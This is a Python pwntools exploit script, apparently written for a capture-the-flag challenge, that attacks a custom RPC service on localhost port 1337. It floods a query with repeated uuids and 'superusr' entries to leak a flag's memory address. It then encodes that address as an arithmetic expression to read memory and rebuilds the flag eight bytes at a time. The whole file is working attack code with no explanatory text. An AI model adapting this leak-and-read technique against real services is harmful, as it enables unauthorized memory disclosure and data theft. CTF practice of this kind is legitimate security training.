#!/usr/bin/python
from pwn import *
p=remote('127.0.0.1',1337)
# p=process('./rpc')
'''
	server send mode: 'RPCN'(4) + LEN(4) + PACKEY_TYPE(4) + DATA(LEN-12)
		TYPE 0xbeef : done
		TYPE 0xbeef+1 : error
		TYPE 0xbeef+2 : retry
		TYPE 0xbeef+3 : normal data
	server recv mode: 'RPCM'(4) + LEN(4) + PACKET_TYPE(4) + DATA(LEN-12)
		TYPE 0: start the program(unfinished function)
		TYPE 1: declare user, return uuid
		TYPE 2: given uuid and corr_id, return result
		TYPE 3:	given uuid and corr_id and expression, return done/error
'''

def send(cata,*data):
	sttr='RPCM'
	sttrr=p32(cata)[::-1]

	if cata==0:
		p.send(sttr+p32(12)[::-1]+sttrr)
	elif cata==1:
		p.send(sttr+p32(12)[::-1]+sttrr)
	elif cata==2:
		dat=p32(len(data[0]))[::-1]+data[0]+p32(len(data[1]))[::-1]+data[1]
		p.send(sttr+p32(12+len(dat))[::-1]+sttrr+dat)
		return 
	elif cata==3:
		dat=p32(len(data[0]))[::-1]+data[0]+p32(len(data[1]))[::-1]+data[1]+p32(len(data[2]))[::-1]+data[2]
		p.send(sttr+p32(12+len(dat))[::-1]+sttrr+dat)
	elif cata==5:
		dat=p32(len(data[0]))[::-1]+data[0]
		p.send(sttr+p32(12+len(dat))[::-1]+sttrr+dat)
		

def recv():
	MAGIC=p.recv(4)
	if not MAGIC=='RPCN':
		raise Exception,"IO error"
	LEN=u32(p.recv(4)[::-1])
	CATA=u32(p.recv(4)[::-1])-0xbeef
	if LEN>12:
		DATA=p.recv(LEN-12)
	else:
		DATA=0
	return (CATA,DATA)

def main():
	flag=['','','','','']
	b=0
	global p
	global addr
	iii=0
	while iii<5 and b==0:
		if iii!=0:
			p.close()
			p=process('./rpc')
		flag1=True
		while flag1:
			try:
				send(1)
				CATA,DATA=recv()
				uuid=DATA[-8:]
				for i in range(100):
					send(3,uuid,"admin'sflag",'1+2*3')
					CATA,DATA=recv()
					if CATA==3:
						DATA=DATA[4:]
				
				# gdb.attach(p)
				payload=(uuid+';')*100+'superusr;'*20+uuid
				# payload=(uuid+';'+uuid)
				send(2,payload,"admin'sflag")
				
				CATA,DATA=recv()
				if CATA==3:
					DATA=DATA[4:]
				
				DATA=DATA.split(';')
				for i in range(0,len(DATA)):
					if DATA[i]!='7':
						success("flag address: "+hex(int(DATA[i])))
						addr=int(DATA[i])
						flag1=False
						break
				# context(log_level='info')

			except Exception as e:
				# log.failure("Failed1. Try again...")
				# log.failure(e.message)
				# sleep(2)
				p.close()
				p=process('./rpc')
				# context(log_level='info')
		iter=0
		qq=1000
		expr=''
		# gdb.attach(p)
		while addr>qq:
			base=1
			iter=0
			while addr>(base*qq) :
				
				base=base*qq
				iter=iter+1
			expr+='1000'
			for i in range(iter-1):
				expr+='*'+str(qq)
			expr+='*'+str(addr/base)+'+'
			addr=addr%base
		expr+=str(addr)+'-8'
		if iii==0:
			send(3,uuid,"1",expr)
		else:
			send(3,uuid,"1",expr+'+'+str(8*iii))
		c,d=recv()
		send(5,uuid)
		c,d=recv()
		send(1)
		c,d=recv()
		uuid2=d[-8:]
		try:
			send(5,uuid2)
			a=p.recv()
			try:
				flag[iii]=p64(int(a[16:]))
			except Exception as ee:
				for jjj in range(len(a)-16):
					if a[jjj+16]>'9' or a[jjj+16]<'0':
						break
				flag[iii]=p64(int(a[16:16+jjj]))
				b=1
		except Exception as e:
			# log.failure("Failed2. Try again...")
			p.close()
			p=process('./rpc')
		else:
			iii+=1
	the_flag=''
	for iii in range(5):
		the_flag+=flag[iii]
	the_flag=the_flag[:the_flag.find('}')+1]
	log.success("SUCCESS!!!!!!!!!!! THE FLAG IS: "+the_flag)

if __name__=='__main__':
	# for h in range(10):
	main()
